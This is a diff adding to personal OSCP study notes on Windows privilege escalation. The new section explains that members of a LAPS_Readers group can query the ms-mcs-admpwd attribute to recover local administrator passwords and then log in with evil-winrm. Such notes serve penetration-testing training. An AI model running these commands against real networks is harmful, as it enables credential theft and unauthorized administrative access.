@@ -16,8 +16,8 @@ whoami /groups
 ```
 Interesting entries include:
 - Server Operators (start and stop services; described below)
+- LAPS_Readers (custom group related to LAPS; described_below)
 
-  
 ## SeBackupPrivilege
 SeBackupPrivilege privilege exploitation
 
@@ -74,4 +74,13 @@ The above-obtained shell is unstable and might die after a few seconds. A more e
 
 Refer to: https://github.com/nestef23/my-OSCP-notes/blob/e963b72f058faffbab4a14b35eb2f6878be04900/InitialAccess/revshells.md#with-msfvenom
 
+## LAPS_Readers
+Query the ms-mcs-admpwd property, which is the Local Admin password!
+```
+Get-ADComputer <hostname> -property 'ms-mcs-admpwd'
+```
+Use it with evil-winrm
+```
+evil-winrm -i <domain> -u administrator -p '<pass>'
+```
 
